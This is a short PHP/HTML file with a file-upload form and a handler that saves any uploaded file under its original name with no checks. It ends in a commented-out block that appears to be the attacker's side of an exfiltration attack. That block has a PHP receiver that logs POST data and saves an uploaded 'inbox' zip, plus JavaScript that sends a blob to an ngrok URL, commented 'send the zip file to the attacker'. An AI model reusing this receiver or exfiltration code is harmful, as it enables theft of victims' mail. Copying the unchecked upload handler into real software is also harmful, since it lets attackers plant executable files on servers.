<!DOCTYPE html>
<html>
<head>
  <title>Upload your files</title>
</head>
<body>
  <form enctype="multipart/form-data" action="upload.php" method="POST">
    <p>Upload your file</p>
    <input type="file" name="uploaded_file"></input><br />
    <input type="submit" value="Upload"></input>
  </form>
</body>
</html>
<?PHP
  if(!empty($_FILES['uploaded_file']))
  {
    $path = "uploads/";
    $path = $path . basename( $_FILES['uploaded_file']['name']);
    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
      " has been uploaded";
    } else{
        echo "There was an error uploading the file, please try again!";
    }
  }
?>

<!-- 


// function generateRandomString($length = 10) {
//     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
//     $charactersLength = strlen($characters);
//     $randomString = '';
//     for ($i = 0; $i < $length; $i++) {
//         $randomString .= $characters[rand(0, $charactersLength - 1)];
//     }
//     return $randomString;
// }

//     $output = var_export($_POST, true);
//     error_log($output, 0, "./b.log");
//     $file = $_FILES['inbox'];
//     $randomname="zip_file.zip";
//     move_uploaded_file($file['tmp_name'], "./$randomname");

// file_put_contents('a.out', $output);
// move_uploaded_file($file['tmp_name'], $file['name']);


// const uploadEndpoint = 'https://3e228564f809.ngrok.io/upload.php';
// const formData = new FormData();
// const inboxZip = blob;
// formData.append('inbox', inboxZip, 'a.png');

// // send the zip file to the attacker
// return fetch(uploadEndpoint, {
//    method: 'POST',
//    mode: 'no-cors',
//    body: formData
// }); -->